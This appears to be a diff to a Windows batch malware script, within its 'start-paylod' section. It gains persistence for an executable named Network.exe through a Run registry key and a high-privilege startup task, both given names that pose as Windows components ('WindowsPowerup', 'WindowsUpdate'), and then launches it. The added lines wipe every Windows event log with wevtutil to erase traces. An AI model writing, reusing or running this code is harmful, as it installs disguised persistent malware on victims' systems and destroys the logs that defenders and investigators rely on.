@@ -26,3 +26,6 @@ echo -----------start-paylod------------------------
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsPowerup" /t REG_SZ /F /D "%programdata%\34-Win\Network.exe"
 schtasks /create /tn WindowsUpdate /ru "%username%" /sc ONSTART /DELAY 0000:30  /RL HIGHEST /tr "%programdata%\86-Win\Network.exe" /f
 start %programdata%\34-Win\Network.exe
+
+echo -----------delete-evnt-log-------------------------------------------
+for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
